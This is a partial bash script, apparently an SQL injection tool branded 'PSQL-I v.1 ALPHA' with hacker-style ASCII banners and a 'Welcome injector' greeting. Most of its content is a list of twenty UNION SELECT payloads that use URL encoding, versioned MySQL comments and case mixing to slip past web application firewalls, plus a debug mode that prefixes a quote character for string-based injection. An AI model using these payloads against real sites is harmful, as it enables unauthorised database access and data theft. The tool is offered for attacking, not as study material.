...
union3="%23%0aUnion%%0aSelect%23%0a"
union4="%23%0Aand%23%0Amod(9,4)%23%0Aunion%%0Aselect%23%0A"
union5="%23%0Aand%23%0Amod(9,4)%23%0Aunion%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0Aselect%23%0A"
union6="%0A/*//!50000%55nIOn*//yoyu/all/*/%0A/!%53eLEct*/%0A/nnaa/"
union7="%75%6e%69%6f%6e%20%73%65%6c%65%63%74"
union8="/*8/and/8/0+/8/UniOn/8/sEleCT/8*/"
union9="or .0union/*/distinctrow select/*/distinctrow+"
union10="/!50000%55nIoN/ /!50000%53eLeCt/"
union11="%55nion(%53elect 1,2,3)– –"
union12="+union+distinct+select+"
union13="+union+distinctROW+select+"
union14="/*//!12345UNION SELECT*//**/"
union15="/*//!50000UNION SELECT*//**/"
union16="union /!50000%53elect/"
union17="+#uNiOn+#sEleCt"
union18="+#1q%0AuNiOn all#qa%0A#%0AsEleCt"
union19="/!%55NiOn/ /!%53eLEct/"
union20="/!u%6eion/ /!se%6cect/"
...
▒${N}█▐${R}▒▒▒${N}████████████${R}▒▒▒▒       ${P}  Dr.Dork${R}
▒${N}▌▐${R}▒▒${N}██▄▀██████▀▄██${R}▒▒▒  ${N} ⊱⋅ ──────────── ⋅⊰⊱${N}⋅
${N}▐┼▐${R}▒▒${N}██▄▄▄▄██▄▄▄▄██${R}▒▒▒   ${BL}Author: ${BR}./Kedjawen Recode By Tobi${N} 
...
banner5() {
   ...
   ${G}    .---.        .----------- ${N}
  ${G}    /     \  __  /    ------ ${N}
   ${G}  / /     \(  )/    -----  ${N}   \033[7;36m PSQL-I v.1 ALPHA ${N}\033[1;36m\033[1m Recode by Tobi${N}
  ${G}  //////   ' \/ \`   ---   ${N}    \033[2m |==┣▇▇▇▇▇▇▇▇═─-SQl-i ${N}
...
banner4() {
  echo -e " 
          ...
          \033[7m   ▄ ▀████▀████▀ ▄    ${N}  ${O}./Kedjaw${O}3${O}n Recode By Tobi${N}
          \033[7m ▀█    ██▀█▀██    █▀  ${N}
...
echo -e "${N}[${R}@${N}]. ${G}Welcome injector${N}\n"
if [[ "$debug" = "s" ]];then
  echo "developer mode string based"
  union="%27$union"
fi
